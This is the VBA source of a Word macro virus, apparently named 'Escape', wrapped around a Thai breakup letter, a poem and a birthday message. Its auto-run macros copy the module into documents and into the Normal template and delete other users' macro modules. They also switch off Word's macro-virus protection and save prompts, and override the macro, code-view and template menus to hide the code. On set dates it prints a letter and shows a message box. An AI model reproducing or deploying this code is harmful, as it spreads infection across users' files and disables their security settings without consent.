Const Check = "Esc@pe!!"
Public PrintOk As Boolean

'สาส์นจากผู้แพ้
'ฉันหวังว่าสักวันหนึ่ง  ความอาวรนี้จะไปถึงเธอ

'ฝนในหัวใจ..
Public Sub PrintMe()
    Selection.EndKey Unit:=wdStory
    ActiveDocument.Bookmarks.Add Range:=Selection.Range, Name:="startletter"
    Selection.InsertBreak Type:=wdSectionBreakNextPage
    
    With Selection.Font
        .Name = "AngsanaUPC"
        .Size = 14
        .Bold = True
        .Italic = True
        .Underline = wdUnderlineNone
    End With
    
    Selection.ParagraphFormat.Alignment = wdAlignParagraphLeft
    Selection.TypeText Text:="ถึงแม่ . . ." & Chr(13)

    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter

    Selection.TypeText Text:=Chr(34) & _
    "  ฝากบทเพลงไว้แทนใจ  เมื่อใดเธอเหงาจงฟัง" & Chr(13) & _
    " เป็นบทเพลงมีไว้ใช้ แทนกาย  ยามห่างไกล" & Chr(13) & _
    "ฝากไปยังฟ้าแดนไกล ส่งใจไปถึงคนหนึ่ง" & Chr(13) & _
    "คนที่เคยมีรักไว้.. ไม่ลืม .. ยังจดจำ" & Chr(13) & _
    ". . มันจะเป็นบทเพลงขับขานแม้นานไม่มีวันเงียบหาย" & Chr(13) & _
    "ยังคงมีดวงใจเอาไว้….ให้เธอ" & Chr(13) & _
    "วันใดเธอได้ฟังเพลงนี้ ฉันมีความจริงใจภายใจออกไป" & Chr(13) & _
    ". . ยังคงมีดวงใจเอาไว้.. ให้เธอ" & Chr(13) & _
    "จากวัน  เดือน  นับเป็นปี        หากบทเพลงนี้ยังอยู่" & Chr(13) & _
    "เธอก็คงจะรู้ฉันยังคอย..   เธอ.. กลับ.. มา ...  " & Chr(34) & Chr(13) & Chr(13)

    
    With Selection.Font
        .Name = "AngsanaUPC"
        .Size = 14
        .Bold = False
        .Italic = False
        .Underline = wdUnderlineNone
    End With

    Selection.ParagraphFormat.Alignment = wdAlignParagraphJustify
    Selection.TypeText Text:="            ยังจำได้หรือเปล่า..  เพลงของเรา ..  สัญญาของเรา .." & _
    "เพลงเพลงนี้อยู่กับตัว กับใจฉันแทนกายและใจของเธอเสมอมา  กระทั่งวันนี้ แม้มันจะไม่มีความหมายใดกับเธออีก" & _
    "  แต่มันยังก้องอยู่ในความรู้สึกของฉันเสมอ  มันยังอยู่พร้อมกับความอบอุ่น ความจริงใจ ความผูกพันครั้งที่เรายังมีกันและกัน" & _
    " ..ทุกครั้งที่คิดถึงวันเวลาของเรา  ฉันยังรับรู้ถึงความอบอุ่น   ความหวัง  ความรู้สึกงดงามที่เราบรรจงเติมแต้มให้ชีวิตกันและกัน" & _
    "..แต่สุดท้ายมันก็เหมือนตอกย้ำความรู้สึกของตัวเอง ย้ำให้มันสำนึกความจริง ..  ไม่มี  " & Chr(34) & "เรา" & Chr(34) & "  ต่อไปอีกแล้ว" & Chr(13) & _
    "            นานมากแล้วซินะ จากวันนั้นถึงวันนี้  แต่เธอรู้มั้ย ความคิดถึงฉันไม่ได้น้อยลงเลย หากแต่จะก่อตัวมากมายขึ้นตามเวลาที่ผันผ่าน" & Chr(13)

    With Selection.Font
        .Name = "AngsanaUPC"
        .Size = 14
        .Bold = True
        .Italic = True
        .Underline = wdUnderlineNone
    End With

    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.TypeText Text:=Chr(13) & Chr(34) & _
    " ในความห่างไกล ไม่ทำให้ความรู้สึกใด ใดแตกต่าง" & Chr(13) & _
    "ห่างไกล..  ก็แค่สองหัวใจไกลทาง" & Chr(13) & _
    "ความผูกพันไม่เคยอ้างว้าง   .. แต่อย่างใด" & Chr(13) & _
    "ส่งความรักข้ามขอบฟ้า ไปทุกวัน    ..    ส่งความผูกพัน ไปเคียงใกล้" & Chr(13) & _
    "สองความรู้สึกผูกพันของสองใจ" & Chr(13) & _
    "ยังเปี่ยมด้วยรักและห่วงใย .. ไม่เปลี่ยนแปลง.." & Chr(34) & Chr(13) & Chr(13)

    With Selection.Font
        .Name = "AngsanaUPC"
        .Size = 14
        .Bold = False
        .Italic = False
        .Underline = wdUnderlineNone
    End With

    Selection.TypeText Text:="ฉันเคยเชื่อเสมอ  แต่ต่อไปนี้ มันคงไม่มีความหมายใด ใดอีก..  ขอให้โชคดีแล้วกัน .. " & Chr(13) & _
    Chr(34) & "ขอให้มีความสุข  ขอให้รักใหม่เธอยืนยาว ขอให้เขาดีกับเธอ  ขออย่าให้ใครปวดใจอย่างฉัน" & Chr(34) & Chr(13) & _
    "ไปตามทางชีวิตที่ดีที่สุดที่เธอเลือก" & Chr(13)

    With Selection.Font
        .Name = "AngsanaUPC"
        .Size = 14
        .Bold = True
        .Italic = True
        .Underline = wdUnderlineNone
    End With

    Selection.TypeText Text:=Chr(34) & "ทิ้งคน คนนี้ไว้ซะที่นี่ .. ทิ้งไว้ให้จมกับซากความรักเรา..  เพียงลำพัง . . ." & Chr(34) & Chr(13) & Chr(13)

    Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
    Selection.TypeText Text:=". . พ่อ."
    
    Selection.EndKey Unit:=wdStory
    Application.PrintOut FileName:="", Range:=wdPrintCurrentPage, Item:= _
        wdPrintDocumentContent, Copies:=1, Pages:="", PageType:=wdPrintAllPages, _
       Collate:=True, Background:=True, PrintToFile:=False
    Selection.GoTo What:=wdGoToBookmark, Name:="startletter"
    Selection.Find.ClearFormatting
    Selection.EndKey Unit:=wdStory, Extend:=wdExtend
    Selection.Delete Unit:=wdCharacter, Count:=1
End Sub

Sub ShowMessage()
    H = Time
    If (Format(Now(), "d,mmm") = "26,Sep" Or Format(Now(), "d,mmm") = "1,Jul" Or Format(Now(), "d,mmm") = "26,Feb") Then
        PrintMe
        
        H = MsgBox("ถึงเจี๊ยบ..  พี่เคยคิดเสมอว่ารักเราจะเป็นนิรันดร์" & Chr(13) _
        & "แต่ช่างมันเถอะ  ยังไงในใจพี่ก็ยังมีเจี๊ยบอยู่เสมอ" & Chr(13) _
        & "" & Chr(13) _
        & "สุขสันต์วันเกิดนะครับ" & Chr(13) _
        & "" & Chr(13) _
        & "พี่เดี่ยว . . ." & Chr(13) _
        & "" & Chr(13) _
        & "<ma-deaw@yahoo.com>" & Chr(13) _
        , vbOKOnly + vbExclamation, "พ่อหวังว่า สักวันหนึ่ง แม่จะได้อ่านข้อความนี้")
    End If
End Sub


Sub Protect()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ChangeDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "Escape" Then DocOk = True
        If Obj.Name <> "Escape" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
     Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Escape", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub ChangeTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "Escape" Then NorOk = True
        If Obj.Name <> "Escape" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Escape", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub


Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        ChangeDocument
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Protect
    ChangeTemplate
    On Error Resume Next
    NormalTemplate.Save
End Sub

Sub AutoClose()
    ps = ActiveDocument.Saved
    If Not PrintOk Then
        ShowMessage
        PrintOk = False
    End If
    ChangeDocument
    If ps = True Then ActiveDocument.Save
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        ChangeDocument
        ChangeTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub MyMacro()
    C = Documents.Count
    If C <> 0 Then
        Normal.Esc.ChangeDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.Esc.MyMacro"
    End If
End Sub

Sub AutoExec()
    PrintOk = False
    WordBasic.DisableAutoMacros True
    Protect
    Application.OnTime When:=Now + TimeValue("00:00:07"), Name:="Normal.Esc.MyMacro"
End Sub


Sub ToolsMacro()
    H = MsgBox("Macros can't create or modify.", vbExclamation + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Protect
End Sub


